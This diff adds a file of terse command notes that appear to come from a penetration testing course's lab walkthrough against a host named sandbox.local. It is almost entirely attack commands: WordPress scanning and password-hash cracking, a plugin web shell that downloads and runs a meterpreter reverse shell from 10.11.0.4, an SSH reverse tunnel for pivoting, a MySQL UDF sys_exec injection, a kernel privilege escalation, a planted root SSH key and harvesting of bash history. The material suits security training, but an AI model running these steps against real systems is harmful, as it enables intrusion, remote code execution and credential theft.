@@ -1,1 +1,267 @@
+Public Network Enumeration 
+kali@kali:~$ sudo nmap -sC -sS -p0-65535 sandbox.local
+
+
+
+Web Application Enumeration 
+kali@kali:~$ dirb http://sandbox.local
+
+kali@kali:~$ wpscan --url sandbox.local --enumerate ap,at,cb,dbe
+
+kali@kali:~$ searchsploit elementor
+
+kali@kali:~$ searchsploit ocean-extra
+
+kali@kali:~$ searchsploit wp-survey-and-poll
+
+kali@kali:~$ searchsploit ocean
+
+kali@kali:~$ searchsploit survey poll
+----------------------------------------
+
+
+
+
+
+
+
+Cracking the Password 
+kali@kali:~$ echo '$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/' > pass.txt
+
+kali@kali:~/Desktop/sandbox.local$ john --wordlist=/usr/share/wordlists/rockyou.txt
+pass.txt
+
+
+
+
+
+
+Enumerating the Admin Interface 
+kali@kali:~$ sudo apt install seclists
+
+kali@kali:~$ sudo apt install seclists
+
+kali@kali:/usr/share/seclists/Web-Shells/WordPress$ ls
+
+
+
+
+
+Obtaining a Shell 
+kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
+
+kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip pluginshell.php 
+
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=whoami
+
+kali@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -
+f elf > shell.elf
+
+kali@kali:~$ sudo python3 -m http.server 80
+
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=wget%20http://10.11.0.4/shell.elf
+
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=chmod%20%2bx%20shell.elf
+
+kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
+> set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+> set LHOST 10.11.0.4;\
+> set LPORT 443;\
+> run"
+
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=./shell.elf
+
+meterpreter > shell
+
+whoami
+
+exit
+
+
+
+
+
+
+
+Post-Exploitation Enumeration 
+meterpreter > shell
+
+ifconfig
+
+hostname
+
+cat /etc/issue
+
+cat /proc/version
+
+meterpreter > shell
+
+pwd
+
+cd /var/www/html
+
+ls -alh
+
+cat wp-config.php
+
+
+
+
+
+
+
+
+Creating a Stable Pivot Point 
+nmap
+meterpreter > upload /home/kali/portscan.sh /tmp/portscan.sh
+meterpreter > shell
+cd /tmp
+chmod +x portscan.sh
+./portscan.sh
+mkdir keys
+cd keys
+ssh-keygen
+Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/keys/id_rsa
+cat id_rsa.pub
+
+ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o
+"UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa
+kali@10.11.0.4
+
+kali@kali:~$ sudo netstat -tulpn
+
+
+
+
+
+
+Application/Service Enumeration
+kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=wp -p
+
+MariaDB [(none)]> SHOW Grants;
+
+MariaDB [(none)]> show variables;
+
+kali@kali:~$ searchsploit mariadb
+
+kali@kali:~$ searchsploit mysql
+
+
+
+
+
+
+
+
+Attempting to Exploit the Database
+kali@kali:~$ git clone https://github.com/mysqludf/lib_mysqludf_sys.git
+
+kali@kali:~$ cd lib_mysqludf_sys/
+
+kali@kali:~/lib_mysqludf_sys$ sudo apt update && sudo apt install defaultlibmysqlclient-dev
+
+kali@kali:~/lib_mysqludf_sys$ rm lib_mysqludf_sys.so
+
+kali@kali:~/lib_mysqludf_sys$ make
+
+kali@kali:~/lib_mysqludf_sys$ xxd -p lib_mysqludf_sys.so | tr -d '\n' >
+lib_mysqludf_sys.so.hex
+
+MariaDB [(none)]> set @shell =
+0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b
+0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000
+000;
+
+MariaDB [(none)]> select @@plugin_dir;
+
+
+
+
+
+
+
+
+
+
+More Thorough Post Exploitation
+meterpreter > shell
+netstat -tulpn
+uname -a
+kali@kali:~$ searchsploit ubuntu 16.04
+find / -name gcc -type f 2>/dev/null
+
+
+
+
+
+
+
+Privilege Escalation 
+kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
+kali@kali:~$ gcc 45010.c -o 45010
+kali@kali:~$ 
+
+meterpreter > upload /home/kali/45010 /tmp/
+meterpreter > shell
+cd /tmp
+chmod +x 45010
+./45010
+whoami
+
+kali@kali:~$ ssh-keygen
+
+kali@kali:~$ cat:~/.ssh/id_rsa.pub
+
+mkdir /root/.ssh
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" >
+/root/.ssh/authorized_keys
+
+kali@kali:~$ ssh root@sandbox.local
+
+
+
+
+
+
+
+Searching for DB Credentials 
+root@ajla:~# cd /home/ajla
+root@ajla:/home/ajla# ls -alh
+root@ajla:/home/ajla# cat ./.bash_history
+root@ajla:/home/ajla# cat ~/.bash_history
+
+
+
+
+
+
+
+Targeting the Database Again
+kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=root -p
+
+MariaDB [(none)]> set @shell =
+0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b
+0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000
+000;
+
+MariaDB [(none)]> select @@plugin_dir;
+
+MariaDB [(none)]> select binary @shell into dumpfile
+'/home/dev/plugin/udf_sys_exec.so';
+
+MariaDB [(none)]> create function sys_exec returns int soname 'udf_sys_exec.so';
+
+MariaDB [(none)]> select * from mysql.func where name='sys_exec';
+
+kali@kali:~$ sudo python3 -m http.server 80
+
+MariaDB [(none)]> select sys_exec('wget http://10.11.0.4');
+
+MariaDB [(none)]> select sys_exec('wget http://10.11.0.4/shell.elf');
+
+MariaDB [(none)]> select sys_exec('chmod +x ./shell.elf');
+
+
+Page 793
 
